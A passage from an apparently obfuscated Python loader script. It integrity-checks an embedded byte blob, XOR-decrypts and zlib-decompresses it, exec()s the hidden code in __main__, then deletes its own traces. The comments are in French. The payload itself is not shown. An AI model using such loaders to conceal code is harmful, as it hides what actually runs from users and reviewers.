_cwCVu7Nt1Ad8YM + _cf69dhjuiw9mdY + _cca3x09t1koetn + _cumbcXQhNT8B3T + _c_SbeC9FokS47H + _czTYBgl3p1dYX8 + _cesVIi6ByEDAHh + _cwlQL3ssH4nEmF + _ccDHupMfy2IPcG + _clIhIlaJFt6koa + _cac1fIio8aYeLg + _cgj0XGwOkoGbn8 + _cfL1rcLKK8EFxF + _cuviCJHv93ZweP + _cowFwUO7rTTVHq + _cwm9vGke3YuRrq + _cijH0iDG_A6UVo + _cn8wZH61M9YsGJ + _ciPxI2FzznfI1F + _cmlmiGKIC4UUxg + _csCm8IMdXk7yfi + _cuANfcDURiVPq6 + _ca74Ul9gZnuM98 + _cbynAv0Q6iOBIn + _cddr9VwOeUNUZ0 + _clmSES7Fu87a0B + _cf2O3PZ5VRzAC7 + _cnr4HDlOx7QzRZ + _crf5_YHuR37E_0 + _cesfFyRQ1YEaED + _cdUdqkclMEuU5p + _cd1fdHVHcdEzWw + _cvI7ppJn0dM4zD + _cmyrulsZW6wpDG + _cnvr5qdVrfwPSF + _cj5r4rHii4WrQM + _cfIpWTgSiACjIU + _cbxeYGLNtO943H + _cyXfrQuoQlwvyg + _cvI9Wr8XyXDQRR + _cfIr3RXlvu8tZX + _cn8Oxha4E31bKg + _cetdLPK6wUzkPf + _cfryB7AGKjZ1l3 + _csX6Sy_iNWZo9Z + _cra62YEv5ExNxC + _cvT66HTY67RbEd + _ccxFfdUOApYQO2 + _cu3v_iO5f0fXt5 + _co89g91UF7kQQR + _chXvXPzVFBLL89 + _chSiuF0Eid6qUC + _cgLJ8W7QjeUoKH + _cmI8jcbu_7zzkO + _coQrxeu5uPWOwg + _cwP9Ia_L9oRVLw + _cy5BC1gGhbFPMi + _cwzaGbxa0yv_IN + _cb3vLIXhC9sShT + _cgs_C245468mvV + _conTO5RG9S8g_V + _cjEM78tmTyR7Er + _czsrQg_w7T9ZsQ + _cp7CtbAS52imD6 + _cnNm4CQLTNSs4z + _cuQjW2G0FdYN7S + _czHjcbxZuFeSdi + _ci73YLi0EfCN25 + _chUsANpzvXlLHW + _cuEjoPJ7xGEyGl + _caubc2Zijf37ml + _cjxBExIbjzEPww + _ckSSFp1fwowwHa + _cbSMzWbW7oFPXE + _ciS4d9upj_Y7ZY + _cg7sXDkyFzrwDX + _ci2URgniCjjZgg + _cpqISPszXNotqW + _cswVmcmQGzifSL + _cxyF_zm6E5T0ai + _cwb1_j5XFf3RRf + _coEU_KGFGGlrC1 + _c_5SDmV4flO3EI + _cs19m0zCIL0ZWh + _cxQvUnDasf2O1C + _csJigg3lch5GHH + _cxGuT607ZTreJz + _chQhXCQOcNZbRJ + _cuzJkUrmVIgdtW + _chNj_iRoJtPTgx + _cw8_ufezfTqG9u + _csmTJLOBpiioVl + _cjMxOGWabelvqu + _cr_CNYogH5iZ2o + _cckuI10s1HnkRN + _cbxfjeQyluSjnu + _cuN1w1IwSt3F6u + _cyFXVoQq3NLRFF + _ctcN_IyS31XAFr + _cqp3mS2zR_mE1s + _cyAsQtv6Y8iyko)
if __import__('hashlib').sha256(_pgHXwUOceVDdJV).hexdigest() != '76d9a19343bda4ec847661e4d1d7fd9d6c181cc160134a6041035d2bb52f0712':
    __import__('sys').exit(1)
_xbHYwTa10zqJsf = bytes([9, 6, 46, 164, 86, 68, 149, 42, 36, 221, 144, 170, 141, 124, 58, 247, 72, 23, 248, 50, 65, 145, 172, 196, 105, 12, 203, 103, 109, 196])
_fkd0D9yLNGjckts = bytes([145, 128, 133, 189, 113, 205, 14, 139, 189, 91, 226, 118, 88, 29, 107, 255, 50, 226, 152, 213, 56, 138, 142, 205, 36, 227, 4, 88, 160, 113])

def _fxkaQOaP7BusvTu(_bmdnPOfye_M1i_, _kzQYrGkxqQTVLf):
    return bytes(_bmdnPOfye_M1i_[_ivKhlj4zvTZvQG] ^ _kzQYrGkxqQTVLf[_ivKhlj4zvTZvQG % len(_kzQYrGkxqQTVLf)] for _ivKhlj4zvTZvQG in range(len(_bmdnPOfye_M1i_)))

def _fdwEiTcxLL4YD_e(_ti85jJQ3oJdzFv):
    import zlib
    return zlib.decompress(_ti85jJQ3oJdzFv) # Un seul niveau de zlib ici pour simplifier

def _feseI791pzofAlB():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xqW5PjaIREhN0r = _fxkaQOaP7BusvTu(_pgHXwUOceVDdJV, _xbHYwTa10zqJsf)
    # 2. Décompression Zlib
    _dvpfM_erB7qvb3 = _fdwEiTcxLL4YD_e(_xqW5PjaIREhN0r)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dvpfM_erB7qvb3.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nyQXEpBEdGWH3I = _main.__dict__
    _nyQXEpBEdGWH3I.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nyQXEpBEdGWH3I)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feseI791pzofAlB()
try:
    del _fxkaQOaP7BusvTu, _fdwEiTcxLL4YD_e, _feseI791pzofAlB
    del _pgHXwUOceVDdJV, _xbHYwTa10zqJsf, _fkd0D9yLNGjckts
except:
    pass
